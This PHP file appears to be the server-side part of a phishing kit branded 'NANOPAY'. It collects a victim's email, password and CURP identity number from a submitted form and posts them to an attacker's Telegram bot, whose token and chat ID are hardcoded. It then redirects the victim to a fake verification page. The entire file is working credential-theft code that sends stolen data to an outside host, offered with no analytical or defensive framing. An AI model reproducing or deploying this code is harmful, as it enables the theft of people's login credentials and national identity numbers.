<?php

ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
date_default_timezone_set('America/Guatemala');

$token = "5279934713:AAHkPk5UHF07sPvomVCm4dRVRYLSU2_4NA8";
#digitales
$mike = $_POST['mail'];
$wase = $_POST['pass'];
$pruc = $_POST['pruc'];

$datos = [
    'chat_id' => '826703008',
    #'chat_id' => '@el_canal si va dirigido a un canal',
    'text' => "NANOPAY RECIBIO \n\n🪙 Email $mike \n✅ Password: $wase \n✅ CURP: $pruc \n\nATTE: PersonalR3T",
    'parse_mode' => 'HTML' #formato del mensaje
];


$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot" . $token . "/sendMessage");
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, TRUE);
curl_setopt($ch, CURLOPT_POSTFIELDS, $datos);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$r_array = json_decode(curl_exec($ch), true);

curl_close($ch);
if ($r_array['ok'] == 1) {
    header("Location: verificacion.php");
} else {
    echo "Mensaje no enviado.";
    print_r($r_array);
}
?>